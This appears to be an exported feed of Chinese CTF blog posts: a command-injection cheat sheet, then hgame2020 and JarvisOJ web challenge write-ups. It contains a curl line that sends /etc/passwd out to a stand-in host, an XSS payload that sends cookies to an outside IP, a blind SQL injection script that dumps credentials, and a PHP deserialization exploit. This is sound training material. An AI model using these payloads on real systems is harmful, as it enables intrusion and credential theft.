class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">exec</span> 命令 \\; -quitfind . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">exec</span> cat /etc/passwd \\; -quitfind . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">exec</span> <span class=\"hljs-built_in\">echo</span> hello \\; -quit<br></code></pre></td></tr></table></figure></li>\n<li><p>git</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\">git <span class=\"hljs-keyword\">grep</span> -i --<span class=\"hljs-built_in\">line</span>-<span class=\"hljs-keyword\">number</span> -<span class=\"hljs-keyword\">e</span> <span class=\"hljs-string\">&#x27;--open-files-in-pager=命令;&#x27;</span> master<br></code></pre></td></tr></table></figure></li>\n<li><p>wget</p>\n<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs maxima\">$url = &#x27;--<span class=\"hljs-built_in\">directory</span>-<span class=\"hljs-built_in\">prefix</span>=/<span class=\"hljs-built_in\">var</span>/www/html http://<span class=\"hljs-built_in\">example</span>.com/<span class=\"hljs-built_in\">example</span>.php&#x27;;<span class=\"hljs-built_in\">system</span>(escapeshellcmd(&#x27;wget &#x27;.$url));<br></code></pre></td></tr></table></figure></li>\n<li><p>sendmail</p>\n<figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\">sendmail -t -i -f <span class=\"hljs-keyword\">from</span>@sth.com -C<span class=\"hljs-regexp\">/etc/</span>passwd -X<span class=\"hljs-regexp\">/tmp/</span>output.txt &lt; mail.txt<br></code></pre></td></tr></table></figure></li>\n<li><p>curl</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">curl -F password=@<span class=\"hljs-regexp\">/etc/</span>passwd http:<span class=\"hljs-regexp\">//</span>example.com<br></code></pre></td></tr></table></figure></li>\n<li><p>mysql</p>\n<figure class=\"highlight erlang-repl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs erlang-repl\">mysql -uuser -ppassword -e  \\! 命令<br></code></pre></td></tr></table></figure></li>\n<li><p>untar</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">$zip_name = <span class=\"hljs-string\">&#x27;-d /var/www/html archive.zip&#x27;</span>;<span class=\"hljs-keyword\">system</span>(<span class=\"hljs-string\">&#x27;unzip -j &#x27;</span>.escapeshellarg($zip_name).<span class=\"hljs-string\">&#x27; *.tmp -d /tmp&#x27;</span>);<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h1 id=\"软连接\"><a href=\"#软连接\" class=\"headerlink\" title=\"软连接\"></a>软连接</h1><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">ln</span> -s /etc/passwd <span class=\"hljs-number\">222222</span>.jpgtar cvfp <span class=\"hljs-number\">1</span>.tar <span class=\"hljs-number\">222222</span>.jpg<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"长度限制注入\"><a href=\"#长度限制注入\" class=\"headerlink\" title=\"长度限制注入\"></a>长度限制注入</h1><p><a href=\"https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/\">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a></p>\n<p>例：</p>\n<figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs taggerscript\">&gt;ls<span class=\"hljs-symbol\">\\\\</span>ls&gt;_&gt;<span class=\"hljs-symbol\">\\ </span><span class=\"hljs-symbol\">\\\\</span>&gt;-t<span class=\"hljs-symbol\">\\\\</span>&gt;<span class=\"hljs-symbol\">\\&gt;</span>gls&gt;&gt;_<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"grep大法\"><a href=\"#grep大法\" class=\"headerlink\" title=\"grep大法\"></a>grep大法</h1><p><code>grep -ri . flag</code></p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2020/02/05/hgame2020/",
            "url": "http://blog.m1n.me/2020/02/05/hgame2020/",
            "title": "hgame2020",
            "date_published": "2020-02-05T15:09:06.000Z",
            "content_html": "<p><a href=\"https://hgame.vidar.club/#/challenge/list\">https://hgame.vidar.club/#/challenge/list</a></p>\n<span id=\"more\"></span>\n\n<h1 id=\"week1\"><a href=\"#week1\" class=\"headerlink\" title=\"week1\"></a>week1</h1><h2 id=\"Cosmos的博客\"><a href=\"#Cosmos的博客\" class=\"headerlink\" title=\"Cosmos的博客\"></a>Cosmos的博客</h2><p>刚开始拿到题目提示说git源码泄露，就用githack把源码扫了下来，但是看了半天没有什么东西，后来看了WP才知道直接去git上找历史提交记录，emmmmm</p>\n<h2 id=\"接头霸王\"><a href=\"#接头霸王\" class=\"headerlink\" title=\"接头霸王\"></a>接头霸王</h2><p>考察知识点</p>\n<ol>\n<li>referer</li>\n<li>X-Forwarded-For</li>\n<li>UA</li>\n<li>请求方式</li>\n<li>最后一个也是之前没见过的时间，If-Unmodified-Since，格式If-Unmodified-Since:Tue, 26 Jan 2064 00:00:00 GMT</li>\n</ol>\n<h2 id=\"Code-World\"><a href=\"#Code-World\" class=\"headerlink\" title=\"Code World\"></a>Code World</h2><p>访问发现403，查看源代码发现提示302跳转，就直接访问index.php并且抓包改一下请求方式，然后提示令a=10，题目又提示a=b+c，就用payload?a=1+9,但是还要url编码一下，不然+会变成空格</p>\n<h2 id=\"鸡尼泰玫\"><a href=\"#鸡尼泰玫\" class=\"headerlink\" title=\"鸡尼泰玫\"></a>鸡尼泰玫</h2><p>提示分数要60000以上，抓包改一下就好了</p>\n<h1 id=\"week2\"><a href=\"#week2\" class=\"headerlink\" title=\"week2\"></a>week2</h1><h2 id=\"Cosmos博客的后台\"><a href=\"#Cosmos博客的后台\" class=\"headerlink\" title=\"Cosmos博客的后台\"></a>Cosmos博客的后台</h2><p>访问看到登陆界面，刚开始以为是sql注入，弄半天不行，忘记了提示只用了HTML和PHP，然后直接访问发现有?action=login.php，应该可以用php为协议读源码，因此拿到了login.php和admin.php的源码<br>在login.php中发现debug可以读取任意变量，读取一下username和password然后$admin_password又是固定的，读取发现是oe开头的（保存一个0e开头的MD5值和原值以便不时之需s878926199a/<br>0e545993274517709034328855841020），这样就可以突破登陆，就来到了admin.php页面，读源码发现用CSRF和file伪协议拿到flag，payload：file://localhost/flag</p>\n<h2 id=\"Cosmos的留言板-1\"><a href=\"#Cosmos的留言板-1\" class=\"headerlink\" title=\"Cosmos的留言板-1\"></a>Cosmos的留言板-1</h2><p>用单引号闭合回显不一样，存在sql<br>注入点，发现过滤了空格还有select，空格可以用/**/绕过，select可以双写绕过。但是这里的#要url编码成%23，不然过不去 ，一直卡在这里，然后就是熟悉的拿flag环节</p>\n<h2 id=\"Cosmos的新语言\"><a href=\"#Cosmos的新语言\" class=\"headerlink\" title=\"Cosmos的新语言\"></a>Cosmos的新语言</h2><p>访问mycode拿到源码，就是一层又一层的加密，，按照加密步骤解密就好了。由于token会实时刷新，这里用py脚本跑一下就好了</p>\n<h2 id=\"Cosmos的聊天室\"><a href=\"#Cosmos的聊天室\" class=\"headerlink\" title=\"Cosmos的聊天室\"></a>Cosmos的聊天室</h2><p>提示必须管理员的token才能拿flag，结合题目看应该是考察XSS拿cookie。然后开始测试过滤，发现过滤了&lt;，但是可以通过HTML实体编码绕过，构造payload，（这里放一个拿cookie并且登陆的总结文章<a href=\"https://blog.csdn.net/lhh134/article/details/86477305%E4%BB%A5%E4%BE%BF%E6%97%A5%E5%90%8E%E5%BF%98%E8%AE%B0%EF%BC%89\">https://blog.csdn.net/lhh134/article/details/86477305以便日后忘记）</a><br>然后用payload：<code>&lt;svg/onload=&quot;&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x34;&amp;#x37;&amp;#x2e;&amp;#x39;&amp;#x36;&amp;#x2e;&amp;#x32;&amp;#x33;&amp;#x33;&amp;#x2e;&amp;#x32;&amp;#x31;&amp;#x36;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;&quot;</code>拿到了token<br>/?token=f802788a02a51f9c624bb5d91815b，访问flag页面，改一下token就拿到了flag</p>\n<h1 id=\"week3\"><a href=\"#week3\" class=\"headerlink\" title=\"week3\"></a>week3</h1><h2 id=\"序列之争-Ordinal-Scale\"><a href=\"#序列之争-Ordinal-Scale\" class=\"headerlink\" title=\"序列之争 - Ordinal Scale\"></a>序列之争 - Ordinal Scale</h2><p>先查看源代码发现source.zip，拿到源码，初步看一下应该是PHP反序列化的题目，先看一下game.php发现</p>\n<figure class=\"highlight php-template\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php-template\"><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$game</span>-&gt;rank-&gt;Get() === <span class=\"hljs-number\">1</span>)&#123;<span class=\"hljs-meta\">?&gt;</span></span><span class=\"xml\"></span><br><span class=\"xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">h2</span>&gt;</span>hgame&#123;flag_is_here&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">h2</span>&gt;</span></span><br><span class=\"xml\">    </span><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> &#125;<span class=\"hljs-meta\">?&gt;</span></span><br></code></pre></td></tr></table></figure>\n<p>于是找一下game类，其中rank在__construct方法中，新建的Rank类，而Rank类中的rank由__construct方法创建，来自session或者直接随机，也就是说可以让rank=1，但是发现有__destruct方法来判断Rank类是不是服务器定义的，但是这里可以利用construct函数定义$this-&gt;key = &amp;$this-&gt;severKey来绕过，接下来就是找反序列化的点，发现在Monster类中存在反序列化的点，但是是通过cookie的方式传入的，也就是说我们要想办法构造符合的cookie来将payload传入，这里就需要知道encryptKey是多少，而encryptKey是由参数传入的：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$data</span> = [<span class=\"hljs-variable\">$playerName</span>, <span class=\"hljs-keyword\">$this</span>-&gt;encryptKey];<br><br><span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">init</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$data</span></span>)</span>&#123;<br>        <span class=\"hljs-keyword\">foreach</span>(<span class=\"hljs-variable\">$data</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$key</span> =&gt; <span class=\"hljs-variable\">$value</span>)&#123;<br>            <span class=\"hljs-keyword\">$this</span>-&gt;welcomeMsg = sprintf(<span class=\"hljs-keyword\">$this</span>-&gt;welcomeMsg, <span class=\"hljs-variable\">$value</span>);<br>            <span class=\"hljs-keyword\">$this</span>-&gt;sign .= md5(<span class=\"hljs-keyword\">$this</span>-&gt;sign . <span class=\"hljs-variable\">$value</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>\n<p>其中foreach用法：<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/1.png\" alt=\"1\"><br>以及sprintf用法：<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/2.png\" alt=\"2\"><br>也就是说我们可以通过将playername赋值为%s就可以循环的将第二个值输出，拿到encryptKey。<br>exp：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Rank</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$rank</span> = <span class=\"hljs-number\">1</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$serverKey</span>;     <span class=\"hljs-comment\">// 服务器的 Key</span><br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$key</span>;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>)</span>&#123;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;key = &amp;<span class=\"hljs-keyword\">$this</span>-&gt;serverKey;<br>    &#125;<br>&#125;<br><br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">new</span> Rank();<br><span class=\"hljs-variable\">$encryptKey</span> = <span class=\"hljs-string\">&quot;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&quot;</span>;<br><span class=\"hljs-variable\">$playername</span> = <span class=\"hljs-string\">&quot;%s&quot;</span>;<br><span class=\"hljs-variable\">$data</span> = [<span class=\"hljs-variable\">$playername</span>, <span class=\"hljs-variable\">$encryptKey</span>];<br><span class=\"hljs-variable\">$sign</span> = <span class=\"hljs-string\">&quot;&quot;</span>;<br><span class=\"hljs-keyword\">foreach</span>(<span class=\"hljs-variable\">$data</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$key</span> =&gt; <span class=\"hljs-variable\">$value</span>)&#123;<br>    <span class=\"hljs-variable\">$sign</span> .= md5(<span class=\"hljs-variable\">$sign</span> . <span class=\"hljs-variable\">$value</span>);<br>&#125;<br><br><span class=\"hljs-variable\">$sign</span> = md5(serialize(<span class=\"hljs-variable\">$a</span>) . <span class=\"hljs-variable\">$sign</span>);<br><br><span class=\"hljs-variable\">$sign</span> = base64_encode(serialize(<span class=\"hljs-variable\">$a</span>) . <span class=\"hljs-variable\">$sign</span>);<br><br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$sign</span>;<br></code></pre></td></tr></table></figure>\n<p>改一下cookie就拿到了flag</p>\n<h2 id=\"二发入魂\"><a href=\"#二发入魂\" class=\"headerlink\" title=\"二发入魂\"></a>二发入魂</h2><p>打开题目一脸懵逼，不知道在干什么，也不知道要干什么，看了WP才知道好像是要通过生成的随机数来还原seed，难怪图片说赶快交出种子。。有两种方法可以拿到seed，一种是通过得知</p>\n<ol>\n<li>从mt_rand()获取2个值：R000以及R227，中间间隔226个值；此外还需知道R000之前已生成的值的个数（用i表示）；</li>\n<li>根据这些值算出加扰状态值；</li>\n<li>异或这些状态值，推测出原始的状态值（s228）；</li>\n<li>根据s228，推测出s0，获取种子。<br><a href=\"https://www.anquanke.com/post/id/196831\">https://www.anquanke.com/post/id/196831</a><br>还有一种是通过php的php_mt_seed函数直接爆破seed<br><a href=\"https://www.freebuf.com/vuls/192012.html\">https://www.freebuf.com/vuls/192012.html</a></li>\n</ol>\n<p>放一个网上的exp：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\">import requests<br>import os<br>s = requests<span class=\"hljs-selector-class\">.session</span>()<br>url = <span class=\"hljs-string\">&quot;https://twoshot.hgame.n3ko.co/random.php?times=228&quot;</span><br>cookie = &#123;<span class=\"hljs-string\">&#x27;PHPSESSID&#x27;</span>:<span class=\"hljs-string\">&#x27;lf08on0tsqpggqqvulpsg278h1&#x27;</span>&#125;<br>c = s<span class=\"hljs-selector-class\">.get</span>(url,cookies = cookie)<br>ans = str(c.text)<br>ans = eval(ans)<br>R0 = ans<span class=\"hljs-selector-attr\">[0]</span><br>R227 = ans<span class=\"hljs-selector-attr\">[227]</span><br>req = <span class=\"hljs-string\">&#x27;python reverse_mt_rand.py &#x27;</span>+str(R0)+<span class=\"hljs-string\">&#x27; &#x27;</span>+str(R227)+<span class=\"hljs-string\">&#x27; 0 0&#x27;</span><br><span class=\"hljs-selector-tag\">p</span> = os<span class=\"hljs-selector-class\">.popen</span>(req)<br>x = <span class=\"hljs-selector-tag\">p</span><span class=\"hljs-selector-class\">.read</span>()<br><span class=\"hljs-selector-tag\">p</span><span class=\"hljs-selector-class\">.close</span>()<br>x = str(x<span class=\"hljs-selector-class\">.replace</span>(<span class=\"hljs-string\">&#x27;\\n&#x27;</span>,<span class=\"hljs-string\">&#x27;&#x27;</span>))<br>url2 = <span class=\"hljs-string\">&quot;https://twoshot.hgame.n3ko.co/verify.php&quot;</span><br>data = &#123;<span class=\"hljs-string\">&quot;ans&quot;</span>:x&#125;<br>final = s<span class=\"hljs-selector-class\">.post</span>(url = url2,cookies = cookie,data = data)<br><span class=\"hljs-function\"><span class=\"hljs-title\">print</span><span class=\"hljs-params\">(final.text)</span></span><br><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"Cosmos的二手市场\"><a href=\"#Cosmos的二手市场\" class=\"headerlink\" title=\"Cosmos的二手市场\"></a>Cosmos的二手市场</h2><p>条件竞争的题目，用burp发包，买入比卖出少一些，刷余额</p>\n<h2 id=\"Cosmos的留言板-2\"><a href=\"#Cosmos的留言板-2\" class=\"headerlink\" title=\"Cosmos的留言板-2\"></a>Cosmos的留言板-2</h2><p>发现删除留言部分存在sql注入，由于没有回显，只能盲注<br><img src=\"https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/3.png\" alt=\"3\"></p>\n<p>时间盲注脚本：</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">import requests<br>import time<br><br>url = &quot;http://139.199.182.61:19999/index.php?method=<span class=\"hljs-keyword\">delete</span>&amp;delete_id=<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">test = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">database</span>()<span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">schema = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>schema_name<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>information_schema.schemata<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">table = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>group_concat(table_name)<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>information_schema.tables<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">where</span><span class=\"hljs-comment\">/**/</span>table_schema=<span class=\"hljs-keyword\">database</span>()<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">column = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>group_concat(column_name)<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>information_schema.columns<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">where</span><span class=\"hljs-comment\">/**/</span>table_name=<span class=\"hljs-string\">&#x27;user&#x27;</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">data = &quot;</span><span class=\"hljs-keyword\">select</span><span class=\"hljs-comment\">/**/</span>concat_ws(<span class=\"hljs-number\">0x5e</span>,name,<span class=\"hljs-keyword\">password</span>)<span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">from</span><span class=\"hljs-comment\">/**/</span>babysql.<span class=\"hljs-keyword\">user</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-keyword\">limit</span><span class=\"hljs-comment\">/**/</span><span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">result = &quot;</span><span class=\"hljs-string\">&quot;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">cookie = &#123;&#x27;PHPSESSID&#x27;:&#x27;9g4b91gspvooe2up4k2blubbqo&#x27;&#125;</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\">for i in range(1,20):</span><br><span class=\"hljs-string\">\tfor j in range(33,127):</span><br><span class=\"hljs-string\">\t\tpayload = url + &quot;</span><span class=\"hljs-keyword\">if</span>(ascii(<span class=\"hljs-built_in\">substr</span>((&#123;&#125;),&#123;&#125;,<span class=\"hljs-number\">1</span>))=&#123;&#125;,sleep(<span class=\"hljs-number\">5</span>),<span class=\"hljs-number\">1</span>)--+<span class=\"hljs-string\">&quot;.format(data,i,j)</span><br><span class=\"hljs-string\">\t\tprint(chr(j))</span><br><span class=\"hljs-string\">\t\tt1 = time.time()</span><br><span class=\"hljs-string\">\t\tr = requests.get(payload,cookies = cookie)</span><br><span class=\"hljs-string\">\t\tt2 = time.time()</span><br><span class=\"hljs-string\">\t\tif(t2-t1&gt;=5):</span><br><span class=\"hljs-string\">\t\t\tresult+=chr(j)</span><br><span class=\"hljs-string\">\t\t\tprint(result)</span><br><span class=\"hljs-string\">\t\t\tbreak</span><br><span class=\"hljs-string\"></span><br></code></pre></td></tr></table></figure>\n<p>拿到账号密码，但是登陆提示错误，不知道是什么原因，多跑几次才拿到了正确的账号密码：cosmos^f1FXOCnj26Fkadzt4Sqynf6O7CgR</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/11/27/JarvisOj/",
            "url": "http://blog.m1n.me/2019/11/27/JarvisOj/",
            "title": "JarvisOj",
            "date_published": "2019-11-27T14:22:21.000Z",
            "content_html": "<p><a href=\"https://www.jarvisoj.com/\">https://www.jarvisoj.com/</a></p>\n<span id=\"more\"></span>\n\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"LocalHost\"><a href=\"#LocalHost\" class=\"headerlink\" title=\"LocalHost\"></a>LocalHost</h2><p>抓包加一个“X-Forwarded-For: 127.0.0.1”完事</p>\n<h2 id=\"PORT51\"><a href=\"#PORT51\" class=\"headerlink\" title=\"PORT51\"></a>PORT51</h2><p>刚开始以为改端口就完了，，后来发现是我太菜了，要改我们的访问端口<br><code>curl --loacl-port 51 http://web.jarvisoj.com:32770/</code>就拿到了flag，，学到了</p>\n<h2 id=\"神盾局的秘密\"><a href=\"#神盾局的秘密\" class=\"headerlink\" title=\"神盾局的秘密\"></a>神盾局的秘密</h2><p>进去以后就是一张图片<br>先view-source一下看到了：<br><code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code><br>看到了一个showimg.php，看样子应该可以用img这个参数来读文件，先读一下showimg.php这个文件，没看到啥有用的东西，再看一下index.php看到了有一个反序列化的点，看样子是反序列化的题目，源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <br>\t<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">&#x27;shield.php&#x27;</span>);<br>\t<span class=\"hljs-variable\">$x</span> = <span class=\"hljs-keyword\">new</span> Shield();<br>\t<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;class&#x27;</span>]) &amp;&amp; <span class=\"hljs-variable\">$g</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;class&#x27;</span>];<br>\t<span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">empty</span>(<span class=\"hljs-variable\">$g</span>)) &#123;<br>\t\t<span class=\"hljs-variable\">$x</span> = unserialize(<span class=\"hljs-variable\">$g</span>);<br>\t&#125;<br>\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$x</span>-&gt;readfile();<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p>看到了shield.php，读一下看看：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>\t<span class=\"hljs-comment\">//flag is in pctf.php</span><br>\t<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Shield</span> </span>&#123;<br>\t\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$file</span>;<br>\t\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span 